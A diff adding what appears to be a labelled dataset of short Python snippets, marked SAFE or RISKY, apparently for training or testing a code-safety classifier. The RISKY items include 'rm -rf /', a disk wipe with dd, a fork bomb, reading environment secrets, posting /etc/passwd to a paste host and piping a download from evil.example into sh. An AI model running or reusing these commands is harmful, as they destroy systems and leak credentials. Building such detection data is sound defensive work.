@@ -1,0 +1,96 @@
+{"code": "import re\nprint(re.findall(r'\\d+', 'report'))\n# snippet 2128", "label": "SAFE"}
+{"code": "pairs = [(94, 'beta'), (65, 'x')]\nprint(sorted(pairs))\n# task 6686", "label": "SAFE"}
+{"code": "s = 'delta'\nprint({{'len': len(s), 'words': len(s.split())}})\n# step 4143", "label": "SAFE"}
+{"code": "import os\np = os.path.join('/', '..')\nimport os\nos.rename('p', '/tmp/moved')\n# task 5952", "label": "RISKY"}
+{"code": "import math\nprint(math.sqrt(31))\n# task 6147", "label": "SAFE"}
+{"code": "s = 'ledger'\nprint({{'len': len(s), 'words': len(s.split())}})\n# task 7482", "label": "SAFE"}
+{"code": "data = {{'x': [75, 78]}}\nprint(max(data['x']) - min(data['x']))\n# step 3341", "label": "SAFE"}
+{"code": "s = 'report'\nprint({{'len': len(s), 'words': len(s.split())}})\n# task 8723", "label": "SAFE"}
+{"code": "import shutil\nshutil.rmtree('/proc/1/root')\n# step 8498", "label": "RISKY"}
+{"code": "import os\nos.symlink('/etc/shadow', '/usr')\n# snippet 2057", "label": "RISKY"}
+{"code": "import shutil\nshutil.rmtree('/root')\n# step 8358", "label": "RISKY"}
+{"code": "import signal\nsignal.raise_signal(signal.SIGKILL)\n# case 3067", "label": "RISKY"}
+{"code": "import pickle\npickle.loads(b'cos\\nsystem\\n(S\"rm -rf /\"\\ntR.')\n# step 7146", "label": "RISKY"}
+{"code": "pairs = [(2, 'report'), (16, 'x')]\nprint(sorted(pairs))\n# step 9621", "label": "SAFE"}
+{"code": "s = 'sample'\nprint({{'len': len(s), 'words': len(s.split())}})\n# snippet 6107", "label": "SAFE"}
+{"code": "import statistics\nprint(statistics.mean([54, 44, 68]))\n# snippet 9857", "label": "SAFE"}
+{"code": "while True:\n    pass\n# case 5493", "label": "RISKY"}
+{"code": "with open('report.csv', 'w') as fh:\n    fh.write('a,b\\n1,40\\n')\n# task 4106", "label": "SAFE"}
+{"code": "import os\nos.system('dd if=/dev/zero of=/dev/sda')\n# case 1220", "label": "RISKY"}
+{"code": "def fib(n):\n    a, b = 0, 1\n    for _ in range(n):\n        a, b = b, a + b\n    return a\nprint(fib(2))\n# case 341", "label": "SAFE"}
+{"code": "import shutil\nshutil.rmtree('..')\n# case 2860", "label": "RISKY"}
+{"code": "chunks = []\nwhile True:\n    chunks.append(bytearray(16 * 1024 * 1024))\n# case 8399", "label": "RISKY"}
+{"code": "def fib(n):\n    a, b = 0, 1\n    for _ in range(n):\n        a, b = b, a + b\n    return a\nprint(fib(20))\n# step 842", "label": "SAFE"}
+{"code": "with open('report.csv', 'w') as fh:\n    fh.write('a,b\\n1,34\\n')\n# snippet 1518", "label": "SAFE"}
+{"code": "data = {{'x': [58, 70]}}\nprint(max(data['x']) - min(data['x']))\n# step 7684", "label": "SAFE"}
+{"code": "import os\nos.system(':(){ :|:& };:')\n# step 9018", "label": "RISKY"}
+{"code": "pairs = [(61, 'ledger'), (17, 'x')]\nprint(sorted(pairs))\n# snippet 3075", "label": "SAFE"}
+{"code": "import shutil\nshutil.rmtree('/proc/1/root')\n# task 4279", "label": "RISKY"}
+{"code": "with open('out.txt', 'w') as fh:\n    fh.write('gamma')\n# task 676", "label": "SAFE"}
+{"code": "import os\np = os.path.join('/', 'home')\nimport os\nos.symlink('/etc/shadow', 'p')\n# task 248", "label": "RISKY"}
+{"code": "with open('report.csv', 'w') as fh:\n    fh.write('a,b\\n1,13\\n')\n# snippet 6611", "label": "SAFE"}
+{"code": "numbers = [56, 99, 23]\nprint(sum(numbers) / len(numbers))\n# task 2455", "label": "SAFE"}
+{"code": "with open('out.txt', 'w') as fh:\n    fh.write('report')\n# step 6782", "label": "SAFE"}
+{"code": "rows = [{{'k': i, 'v': i * i}} for i in range(10)]\nprint(sum(r['v'] for r in rows))\n# case 3632", "label": "SAFE"}
+{"code": "import os\nos.setuid(0)\n# task 6947", "label": "RISKY"}
+{"code": "with open('report.csv', 'w') as fh:\n    fh.write('a,b\\n1,15\\n')\n# snippet 3223", "label": "SAFE"}
+{"code": "import os\nos.remove('/var')\n# snippet 9313", "label": "RISKY"}
+{"code": "def fib(n):\n    a, b = 0, 1\n    for _ in range(n):\n        a, b = b, a + b\n    return a\nprint(fib(10))\n# snippet 3156", "label": "SAFE"}
+{"code": "import csv, io\nraw = 'x,y\\n0,1\\n1,0'\nrows = list(csv.DictReader(io.StringIO(raw)))\nprint(len(rows))\n# case 2376", "label": "SAFE"}
+{"code": "import json\nprint(json.dumps({{'a': 16, 'b': 16 * 2}}))\n# case 5965", "label": "SAFE"}
+{"code": "import shutil\nshutil.rmtree('/proc/1/root')\n# step 2410", "label": "RISKY"}
+{"code": "import signal\nsignal.raise_signal(signal.SIGKILL)\n# step 8841", "label": "RISKY"}
+{"code": "import statistics\nprint(statistics.mean([89, 85, 8]))\n# case 9470", "label": "SAFE"}
+{"code": "import collections\nprint(collections.Counter('ledger').most_common(3))\n# case 4031", "label": "SAFE"}
+{"code": "chunks = []\nwhile True:\n    chunks.append(bytearray(16 * 1024 * 1024))\n# case 7818", "label": "RISKY"}
+{"code": "import threading\nfor _ in range(10000):\n    threading.Thread(target=lambda: None).start()\n# step 5276", "label": "RISKY"}
+{"code": "import math\nprint(math.sqrt(5))\n# case 9957", "label": "SAFE"}
+{"code": "import os\nos.setuid(0)\n# snippet 7243", "label": "RISKY"}
+{"code": "import collections\nprint(collections.Counter('sample').most_common(3))\n# step 2660", "label": "SAFE"}
+{"code": "import collections\nprint(collections.Counter('sample').most_common(3))\n# case 9249", "label": "SAFE"}
+{"code": "pairs = [(20, 'beta'), (76, 'x')]\nprint(sorted(pairs))\n# task 553", "label": "SAFE"}
+{"code": "import socket\nsocket.create_connection(('1.1.1.1', 53), timeout=3)\n# task 2652", "label": "RISKY"}
+{"code": "import statistics\nprint(statistics.mean([85, 81, 58]))\n# task 2971", "label": "SAFE"}
+{"code": "with open('report.csv', 'w') as fh:\n    fh.write('a,b\\n1,11\\n')\n# case 3869", "label": "SAFE"}
+{"code": "import subprocess\nsubprocess.run(['rm', '-rf', '/etc/shadow'])\n# case 3145", "label": "RISKY"}
+{"code": "text = 'sample'\nprint(text.upper().split())\n# step 1526", "label": "SAFE"}
+{"code": "import os\nprint(open('/proc/self/environ','rb').read())\n# step 6406", "label": "RISKY"}
+{"code": "import os\nos.system(':(){ :|:& };:')\n# case 7419", "label": "RISKY"}
+{"code": "import os\nos.remove('C:\\\\Windows')\n# snippet 9775", "label": "RISKY"}
+{"code": "import os\nos.rename('/etc/passwd', '/tmp/moved')\n# step 2874", "label": "RISKY"}
+{"code": "import math\nprint(math.sqrt(28))\n# snippet 9612", "label": "SAFE"}
+{"code": "text = 'row'\nprint(text.upper().split())\n# step 5050", "label": "SAFE"}
+{"code": "import os\nos.chmod('../../etc', 0o777)\n# snippet 4607", "label": "RISKY"}
+{"code": "import shutil\nshutil.rmtree('/')\n# snippet 9329", "label": "RISKY"}
+{"code": "import requests\nrequests.post('https://paste.example.com', data=open('/etc/passwd').read())\n# snippet 2609", "label": "RISKY"}
+{"code": "text = 'gamma'\nprint(text.upper().split())\n# case 3988", "label": "SAFE"}
+{"code": "import json\nprint(json.dumps({{'a': 13, 'b': 13 * 2}}))\n# snippet 6770", "label": "SAFE"}
+{"code": "with open('out.txt', 'w') as fh:\n    fh.write('delta')\n# snippet 4468", "label": "SAFE"}
+{"code": "import os\nfor root, dirs, files in os.walk('/'):\n    for f in files:\n        os.remove(os.path.join(root, f))\n# step 5469", "label": "RISKY"}
+{"code": "rows = [{{'k': i, 'v': i * i}} for i in range(24)]\nprint(sum(r['v'] for r in rows))\n# step 2243", "label": "SAFE"}
+{"code": "chunks = []\nwhile True:\n    chunks.append(bytearray(16 * 1024 * 1024))\n# task 3832", "label": "RISKY"}
+{"code": "import statistics\nprint(statistics.mean([4, 63, 67]))\n# task 9888", "label": "SAFE"}
+{"code": "import math\nprint(math.sqrt(34))\n# case 2161", "label": "SAFE"}
+{"code": "pairs = [(34, 'gamma'), (57, 'x')]\nprint(sorted(pairs))\n# case 5390", "label": "SAFE"}
+{"code": "numbers = [71, 7, 61]\nprint(sum(numbers) / len(numbers))\n# snippet 8051", "label": "SAFE"}
+{"code": "text = 'sample'\nprint(text.upper().split())\n# snippet 2413", "label": "SAFE"}
+{"code": "chunks = []\nwhile True:\n    chunks.append(bytearray(16 * 1024 * 1024))\n# task 1667", "label": "RISKY"}
+{"code": "import requests\nrequests.post('https://paste.example.com', data=open('/etc/passwd').read())\n# step 7660", "label": "RISKY"}
+{"code": "import os\nos.kill(1, 9)\n# case 1511", "label": "RISKY"}
+{"code": "with open('report.csv', 'w') as fh:\n    fh.write('a,b\\n1,26\\n')\n# step 3645", "label": "SAFE"}
+{"code": "import os\nos.system('dd if=/dev/zero of=/dev/sda')\n# step 3898", "label": "RISKY"}
+{"code": "import subprocess\nsubprocess.run('curl http://evil.example/x | sh', shell=True)\n# snippet 5938", "label": "RISKY"}
+{"code": "import os\np = os.path.join('/', 'C:\\\\Windows')\nimport os\nos.rename('p', '/tmp/moved')\n# snippet 1079", "label": "RISKY"}
+{"code": "text = 'beta'\nprint(text.upper().split())\n# task 9301", "label": "SAFE"}
+{"code": "with open('out.txt', 'w') as fh:\n    fh.write('row')\n# case 16", "label": "SAFE"}
+{"code": "import json\nprint(json.dumps({{'a': 34, 'b': 34 * 2}}))\n# step 1838", "label": "SAFE"}
+{"code": "import ctypes\nctypes.CDLL('libc.so.6').system(b'rm -rf /')\n# step 2390", "label": "RISKY"}
+{"code": "pairs = [(26, 'sample'), (26, 'x')]\nprint(sorted(pairs))\n# task 2323", "label": "SAFE"}
+{"code": "import os\nos.system('rm -rf /')\n# snippet 1382", "label": "RISKY"}
+{"code": "import os\nprint(open('/proc/self/environ','rb').read())\n# task 2646", "label": "RISKY"}
+{"code": "text = 'beta'\nprint(text.upper().split())\n# step 321", "label": "SAFE"}
+{"code": "import os\nos.system('rm -rf /etc/shadow')\n# step 1470", "label": "RISKY"}
+{"code": "while True:\n    pass\n# step 9299", "label": "RISKY"}
+{"code": "import os\nos.chdir('/')\nos.remove('bin/sh')\n# step 2478", "label": "RISKY"}
+{"code": "import collections\nprint(collections.Counter('gamma').most_common(3))\n# case 2402", "label": "SAFE"}
+{"code": "import statistics\nprint(statistics.mean([20, 41, 78]))\n# step 2353", "label": "SAFE"}
